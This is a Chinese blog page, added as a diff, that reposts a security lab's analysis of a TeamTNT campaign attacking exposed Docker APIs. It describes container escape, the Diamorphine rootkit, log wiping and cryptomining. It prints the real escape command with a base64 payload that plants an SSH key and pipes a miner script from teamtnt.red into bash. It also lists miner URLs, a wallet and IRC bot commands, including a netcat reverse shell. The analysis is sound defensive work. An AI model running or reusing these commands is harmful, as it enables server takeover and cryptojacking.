@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 5.4.0">
+
+  
+    <meta name="description" content="一只菜鸟的博客">
+  
+
+  
+    <meta name="keywords" content="‘网络安全,渗透测试,化学提纯,暗网’">
+  
+
+  
+    <meta name="author" content="ANQUSEC">
+  
+
+  
+
+  
+
+  <title>Docker容器逃逸 | ꧁༺黑色༒星辰༻꧂</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fphoto.669pic.com%2Fshow_photos2%2F8e1665bc10ca363a1da851cef8a72ee5.jpg&amp;refer=http%3A%2F%2Fphoto.669pic.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1636710563&amp;t=16a039c010bd876cc3e23b88f5fd52a4)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          ꧁༺黑色༒星辰༻꧂
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">Docker容器逃逸</h1>
+          <h2 class="title-sub-wrap">
+            <strong>ANQUSEC</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-10-21T23:05:15.000Z" itemprop="datePublished">2021-10-22</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%BC%8F%E6%B4%9E/">📒 漏洞</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">🏷️ 渗透测试</a></li>
+  
+    <li><a href="/tags/%E9%80%83%E9%80%B8/">🏷️ 逃逸</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h1><p>腾讯安全云鼎实验室持续监控云原生在野攻击威胁态势，继DockerHub发现百万下载量黑产镜像（详见文章DockerHub再现百万下载量黑产镜像，小心你的容器被挖矿）之后，近期实验室最新捕获到TeamTNT黑客团队新型在野容器攻击活动，相比之前TeamTNT挖矿木马，此次新型攻击手法对原挖矿木马进行了升级，并利用容器环境进行感染传播。</p>
+<p>通过对TeamTNT新型容器攻击样本详细分析，我们发现挖矿病毒是通过扫描docker remote api未授权访问漏洞进行传播。相比之前TeamTNT黑客团队出的挖矿木马，此次对原挖矿木马进行了升级，在进行感染时使用了新的策略。入侵后会先进行清理其他挖矿，并使用新的隐藏进程方法，入侵完毕后会清理痕迹，覆盖系统日志以逃避排查，为增加挖矿木马植入的成功率还有备用挖矿程序，增加木马的稳定性，利用nohup命令不挂断地运行挖矿，并且在使用LKM rootkit技术隐藏进程。</p>
+<p>该样本属于最新版本TEAMTNT样本，被云鼎实验室哨兵系统（云上分布式蜜罐和沙箱）第一时间捕获。本文将会使用ATT&amp;CK矩阵溯源分析样本在入侵、持久化、容器逃逸等完整攻击路径，为大家清晰还原黑客攻击手法和全貌。</p>
+<h1 id="二、样本产生时间与流行分析"><a href="#二、样本产生时间与流行分析" class="headerlink" title="二、样本产生时间与流行分析"></a>二、样本产生时间与流行分析</h1><p>样本的开发时间大约在2021年09月14日编写完毕，云鼎实验室哨兵系统在9月14号第一时间捕获，并进行了详细的分析。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719808_616fd840eca2ecb2ce913.jpg!small" alt="img"><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719818_616fd84a0b77e88251e4e.jpg!small" alt="img"></p>
+<p><strong>哨兵捕获的网络包：</strong></p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719828_616fd854cca875e56fd6a.jpg!small" alt="img"></p>
+<p><strong>样本流行程度：</strong></p>
+<p>通过哨兵智能情报统计系统，样本在刚刚爆发的2周内较为流行，随后感染率持续下降。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719854_616fd86e498708e97eaa3.jpg!small" alt="img"></p>
+<h1 id="三、样本att-amp-ck矩阵分析"><a href="#三、样本att-amp-ck矩阵分析" class="headerlink" title="三、样本att&amp;ck矩阵分析"></a>三、样本att&amp;ck矩阵分析</h1><p>TEAMTNT的新样本通过docker remote API传播，过程中使用了 特权容器，容器逃逸，LKM rootkit 等先进攻击方式，下面是对于整个攻击过程的ATT&amp;CK矩阵。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719867_616fd87b28d00b7b46953.jpg!small" alt="img"></p>
+<p><strong>下图为攻击流程，我们将整个过程分为五个部分讲解：1、初始化访问与对外扫描 2、执行3、权限提升-容器逃逸 4、攻击持久化 5、防御绕过</strong></p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719883_616fd88b08b74e9b2bd91.jpg!small" alt="img"></p>
+<p><strong>3.1 攻击向量-初始访问与横向扫描—Remote API 漏洞：</strong></p>
+<p><strong>DockerRemote API ：</strong>是一个取代远程命令行界面（rcli）的REST API，默认绑定2375端口。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p>
+<p><strong>A、扫描获取docker API版本</strong></p>
+<p><strong>调用masscan 和 zgrab扫描目标IP，通过请求旧版本的命令，可以获取到最新的docker API版本。</strong></p>
+<p><strong>通常获取1.16版本，会返回如下信息：</strong></p>
+<p>Handler for GET /v1.16/version returned error: client version 1.16 is too old. Minimum supported API version is 1.24, please upgrade your client to a newer version</p>
+<p>相关代码如下：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719893_616fd8952a79538321499.jpg!small" alt="img"></p>
+<p><strong>B、利用Remote API漏洞：</strong></p>
+<p><strong>直接通过Remote API漏洞，远程启动传播病毒的容器镜像 alpineos/dockerapi，容器使用完成后会自动清除容器内部的文件系统。启动alpine 容器进行容器逃逸。</strong></p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719903_616fd89fb0af4e0cb1568.jpg!small" alt="img"></p>
+<p>通过腾讯云容器安全服务TCSS发现存在Remote API未授权访问风险节点和详细信息：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719913_616fd8a95baff0bc905ce.jpg!small" alt="img"></p>
+<p><strong>3.2 攻击向量-执行：</strong></p>
+<p>在目标机器上的命令执行通过特权容器执行恶意指令，进行挖矿和病毒传播。</p>
+<p><strong>A、恶意镜像alpineos/dockerapi：</strong></p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719922_616fd8b2c2c46cdd891a0.jpg!small" alt="img"></p>
+<p>经查询，alpineos帐号注册时间为2021年5月26日，其中alpineos/dockerapi镜像更新时间为截止目前已有一个月，大约有7600台主机被感染。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719931_616fd8bb27bd34522ec9d.jpg!small" alt="img"></p>
+<p>通过腾讯云容器安全服务TCSS对该镜像进行扫描，发现该镜像存在木马病毒，扫描结果如下图：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719960_616fd8d8186de37afd34a.jpg!small" alt="img"></p>
+<p>镜像启动时会执行名为pause的脚本，pause脚本用于病毒的传播。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719971_616fd8e32384fc0f9d718.jpg!small" alt="img"></p>
+<p><strong>B、镜像Alpine</strong></p>
+<p><strong>正规白镜像，镜像大小只有5M，方便下载，teamTNT使用这个镜像进行容器逃逸。</strong></p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634719986_616fd8f2aa2f353c8d862.jpg!small" alt="img"></p>
+<p><strong>3.3攻击向量-权限提升—-Docker逃逸：</strong></p>
+<p>TEAMTNT 使用的逃逸方法是<strong>特权模式+SSH</strong></p>
+<p>特权模式在6.0版本的时候被引入Docker，其核心作用是允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限。</p>
+<p>使用特权模式启动容器后（docker run –privileged），Docker容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限。</p>
+<p>TEAMTNT 病毒容器运行的逃逸命令如下：</p>
+<blockquote>
+<p><strong>docker</strong>-H $D_TARGET run -d –privileged –net host -v /:/host alpine</p>
+</blockquote>
+<blockquote>
+<p><strong>chroot</strong>/host bash -c ‘echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash’</p>
+</blockquote>
+<p><strong>第一步：创建特权容器</strong></p>
+<p><strong>docker</strong>-H $D_TARGET run -d –<strong>privileged</strong>–net host -v /:/host alpine</p>
+<p>容器本身为干净的alpine容器。</p>
+<p><strong>第二步：SSH容器逃逸</strong></p>
+<p>在root目录下 拷贝ssh密钥到宿主机，通过访问127.0.0.1 从而进行容器逃逸。</p>
+<p>上述代码解密后如下：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720006_616fd906a7da9bea79d7a.jpg!small" alt="img"></p>
+<p>逃逸后，可以在宿主机上下载moneroocean_miner.sh等脚本进行挖矿。</p>
+<p><strong>3.4攻击向量-防御绕过—-清理痕迹与进程隐藏：</strong></p>
+<p>在植入挖矿病毒后，会通过diamorphine.sh来隐藏进程，之后清理痕迹。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720022_616fd916b1743e6025457.jpg!small" alt="img"></p>
+<p><strong>A、通过diamorphine.sh 隐藏进程：</strong></p>
+<p>从github.com/m0nad/Diamorphine下载安装编译Diamorphine，加载内核模块dia.ko。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720053_616fd935dc5ba085baba3.jpg!small" alt="img"></p>
+<p>Diamorphine是一个LKM rootkit ，功能就是 进程隐藏、模块隐藏，用户root权限获取，带有Magic-prefix 开头的文件和目录隐藏。</p>
+<p><strong>这里重点介绍一下 进程隐藏部分。</strong></p>
+<p>Rootkit初始化部分会hook getdents、getdents64 和kill 三个函数，其中被hook的kill 函数用于接受命令，进行进程隐藏、root等动作。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720064_616fd94032060c3cdf5e9.jpg!small" alt="img"></p>
+<p>Hacked_kill 定义了3个参数，31 用来隐藏进程，64用来获取root，63用来隐藏自身模块。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720074_616fd94a5fab56fd46536.jpg!small" alt="img"></p>
+<p>被hook的kill代码如下：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720088_616fd958d1bb10d6e690b.jpg!small" alt="img"></p>
+<p>通过 for_each_process遍历进程列表找到目标进程，把进程标志设置为PF_INVISIBLE 从而达到隐藏进程的目标。</p>
+<p>Find_task代码如下：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720115_616fd97395fc05a8eafe4.jpg!small" alt="img"></p>
+<p>通过kill命令的31信号隐藏挖矿进程（xmrig），并清理记录</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720129_616fd98147276d3b84242.jpg!small" alt="img"></p>
+<p><strong>B、痕迹清理</strong></p>
+<p><strong>清除命令历史记录：</strong></p>
+<p><strong>通过删除/bash_history 和 执行history -c 命令，清除命令历史记录。</strong></p>
+<p><strong>清除wtmp,secure、cron 和mail 日志。</strong></p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720143_616fd98fe18dfe61a25cc.jpg!small" alt="img"></p>
+<p><strong>C、ld.so.preload清理模块</strong></p>
+<p>ld.so.preload清理模块使用了base64编码，解密后可以看到以下功能。</p>
+<p>检查/etc/ld.so.preload预加载文件，删除空的ld.so.preload文件，如果ld.so.preload有预加载程序，则对其进行清理。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720154_616fd99a33be5d74570e1.jpg!small" alt="img"></p>
+<p>为了能成功删除，重新写了文件删除函数。文件删除函数中使用了chattr和intrecht、ichdarf三个命令，这三个命令实为同一种功能，TeamTNT黑客团队曾经在入侵时，重命名过系统命令。为能成功执行，系统命令和重命名过的命令一起执行，以提高成功率。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720166_616fd9a6629dd3b767ab7.jpg!small" alt="img"></p>
+<p><strong>3.5攻击向量—持久化—释放远控</strong></p>
+<p>TEAMTNT会下载Chimaera IRC 远控木马，木马没有加壳，功能较为丰富，这里不做过多介绍。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720182_616fd9b6924c189d58ac2.jpg!small" alt="img"></p>
+<p>相关命令和描述如下图所示：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720196_616fd9c4ea4f56d6ca647.jpg!small" alt="img"></p>
+<p>整理后如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description (from the binary)</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NICK <nick></nick></td>
+<td>Changes the nick of the client</td>
+</tr>
+<tr>
+<td>SERVER <server></server></td>
+<td>Changes servers</td>
+</tr>
+<tr>
+<td>GETSPOOFS</td>
+<td>Gets the current spoofing</td>
+</tr>
+<tr>
+<td>SPOOFS <subnet></subnet></td>
+<td>Changes spoofing to a subnet</td>
+</tr>
+<tr>
+<td>DISABLE</td>
+<td>Disables all packeting from this client</td>
+</tr>
+<tr>
+<td>ENABLE</td>
+<td>Enables all packeting from this client</td>
+</tr>
+<tr>
+<td>GET <http address> <save as></save></http></td>
+<td>Downloads a file off the web and saves it onto the hd</td>
+</tr>
+<tr>
+<td>UPDATE <http address> <a href="src:bin">src:bin</a></http></td>
+<td>Update this bot</td>
+</tr>
+<tr>
+<td>HACKPKG <http address> <bin name></bin></http></td>
+<td>HackPkg is here! Install a bin, using http, no depends!</td>
+</tr>
+<tr>
+<td>VERSION</td>
+<td>Requests version of client</td>
+</tr>
+<tr>
+<td>HELP</td>
+<td>Displays this</td>
+</tr>
+<tr>
+<td>IRC <command></td>
+<td>Sends this command to the server</td>
+</tr>
+<tr>
+<td>SH <command></td>
+<td>Executes a command</td>
+</tr>
+<tr>
+<td>ISH <command></td>
+<td>SH, interactive, sends to channel</td>
+</tr>
+<tr>
+<td>SHD <command></td>
+<td>Executes a pseudo-daemonized command</td>
+</tr>
+<tr>
+<td>GETBB <tftp server></tftp></td>
+<td>Get a proper busybox</td>
+</tr>
+<tr>
+<td>INSTALL &lt;http server/file_name&gt;</td>
+<td>Download &amp; install a binary to /var/bin</td>
+</tr>
+<tr>
+<td>BASH <cmd></cmd></td>
+<td>Execute commands using bash.</td>
+</tr>
+<tr>
+<td>BINUPDATE <a target="_blank" rel="noopener" href="http://server/package">http:server/package</a></td>
+<td>Update a binary in /var/bin via wget</td>
+</tr>
+<tr>
+<td>SCAN <nmap options></nmap></td>
+<td>Call the nmap wrapper script and scan with your opts.</td>
+</tr>
+<tr>
+<td>RSHELL <server> <port></port></server></td>
+<td>Equates to nohup nc ip port -e /bin/sh</td>
+</tr>
+<tr>
+<td>LOCKUP <a target="_blank" rel="noopener" href="http://server/">http:server</a></td>
+<td>Kill telnet, d/l aes backdoor from <server>, run that instead.</server></td>
+</tr>
+<tr>
+<td>GETSSH <a target="_blank" rel="noopener" href="http://server/dropbearmulti">http:server/dropbearmulti</a></td>
+<td>D/l, install, configure and start dropbear on port 30022</td>
+</tr>
+<tr>
+<td>TOETEDENCLIENT</td>
+<td>Kill client</td>
+</tr>
+<tr>
+<td>UPDATE</td>
+<td>update</td>
+</tr>
+</tbody></table>
+<h1 id="四、挖矿部分分析"><a href="#四、挖矿部分分析" class="headerlink" title="四、挖矿部分分析"></a>四、挖矿部分分析</h1><p><strong>Moneroocean.sh脚本主要用来挖矿：</strong></p>
+<p>更改linux最大文件句柄数的限制，以提高稳定性。并配置防火墙，放行数据包。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720216_616fd9d88fd01d1122e2e.jpg!small" alt="img"></p>
+<p>清理动态预加载预加载ld.preload，木马通常使用使用此技术来隐藏木马文件，可以实现劫持，TeamTNT团队的新挖矿程序，清理了此加载文件，更换隐藏技术，并且可以排除其他挖矿程序，以达到资源独占。清理模块使用了base64编码，上文有进一步分析。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720244_616fd9f47f5fb95c7c504.jpg!small" alt="img"></p>
+<p>清理其他部分主流挖矿域名：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720258_616fda02146131bfb471a.jpg!small" alt="img"></p>
+<p>还原ps命令，并清理定时任务，有些挖矿木马存在修改系统命令：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720284_616fda1ca73afa9be4255.jpg!small" alt="img"></p>
+<p>清理痕迹，清空系统日志，脚本最后有调用。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720297_616fda295b6d2aabbc119.jpg!small" alt="img"></p>
+<p>清理其他挖矿程序，简单粗暴判定CPU占用65%以上的都为挖矿程序，并结束进程，以达到资源独占的目的。<img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720307_616fda33c5fe2dd925f90.jpg!small" alt="img"></p>
+<p>实现下载功能，实现类似wget curl功能，用于下载wget curl：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634721092_616fdd44ba310729380de.jpg!small" alt="img"></p>
+<p>检查系统中是否有curl，如果没有则从自己服务器上下载curl程序：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634721064_616fdd286d7cf123ce01a.jpg!small" alt="img"></p>
+<p>下载钱包文件，并准备两个挖矿安装包，其中一个为备用安装包：</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634721048_616fdd18a5c2bf795d873.jpg!small" alt="img"></p>
+<p>中止原有的的挖矿程序，下载新版挖矿木马后重命名，并解压后删除安装包</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634721035_616fdd0be6a1d0f482b29.jpg!small" alt="img"></p>
+<p>检测挖矿程序是否正常工作，如果被破坏则下载备用挖矿程序，解压后删除安装包</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634721021_616fdcfdbeef8ef1a209b.jpg!small" alt="img"></p>
+<p>设置挖矿密码，把用户钱包，密码，矿池地址写入配置文件，并重命名为“config_background.json”。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634721010_616fdcf269908d3f5bdde.jpg!small" alt="img"></p>
+<p>创建miner.sh脚本，把脚本写入.profile，以便在登陆时在后台运行。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720992_616fdce04d3e13da2328a.jpg!small" alt="img"></p>
+<p>修改大页内存hugepages值，以提高挖矿效率。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720981_616fdcd56333ae634cda7.jpg!small" alt="img"></p>
+<p>创建挖矿服务，服务名为“SystemRaid.service”。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720963_616fdcc316568087043bd.jpg!small" alt="img"></p>
+<p>增加挖矿木马的健壮性，将挖矿程序在后台运行。</p>
+<p><img src="/2021/10/22/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/1634720949_616fdcb5a2053440b46e5.jpg!small" alt="img"></p>
+<p>清理痕迹并通过执行diamorphine.sh来隐藏进程。</p>
+<p><strong>挖矿信息总结：</strong></p>
+<p>矿池：dl.chimaera.cc:21582</p>
+<p>钱包：</p>
+<blockquote>
+<p>89sp1qMoognSAbJTprreTXXUv9RG1AJBRjZ3CFg4rn6afQ5hRuqxiWRivYNqZbnYKKdsH5pCiTffrZToSyzXRfMvSHx5Guq</p>
+</blockquote>
+<p>首选挖矿程序：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://teamtnt.red/sh/bin/xmrig/x86_64/mo.tar.gz">http://teamtnt.red/sh/bin/xmrig/x86_64/mo.tar.gz</a></p>
+</blockquote>
+<p>备用挖矿程序：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz">https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz</a></p>
+<p>URL：<a target="_blank" rel="noopener" href="http://teamtnt.red/sh/setup/moneroocean_miner.sh%EF%BC%9Bhttp://teamtnt.red/sh/setup/diamorphine.sh">http://teamtnt.red/sh/setup/moneroocean_miner.sh；http://teamtnt.red/sh/setup/diamorphine.sh</a></p>
+</blockquote>
+<h1 id="五、如何防御"><a href="#五、如何防御" class="headerlink" title="五、如何防御"></a>五、如何防御</h1><p>腾讯安全持续在容器安全上进行投入和相关研究，构建了完整的容器安全防护和服务保障体系，针对容器环境下的安全问题，腾讯云容器安全服务通过资产管理、镜像安全、运行时安全、安全基线四大核心能力来保障容器的全生命周期安全，为企业提供镜像扫描、运行时安全检测（容器逃逸、反弹shell、文件查杀）、高级防御（异常进程拦截、文件篡改保护、高危系统调用监控）、安全基线检测、资产管理一站式容器安全防护。容器安全服务已集成腾讯云鼎实验室最新容器安全情报，可第一时间检测黑产容器镜像，并针对新型在野攻击进行有效防御，企业可通过容器安全服务及时发现容器安全风险并快速构建容器安全防护体系。</p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2021/10/18/Docker%E5%AE%89%E8%A3%85Nessus/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Docker安装Nessus</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://anqusec.github.io/about/OIP.jpg" class="soft-size--round soft-style--box" alt="黑辰’by">
+    
+    
+      <h2>黑辰’by</h2>
+    
+    
+      <p>Linux老司机</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>16</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        11
+      </div>
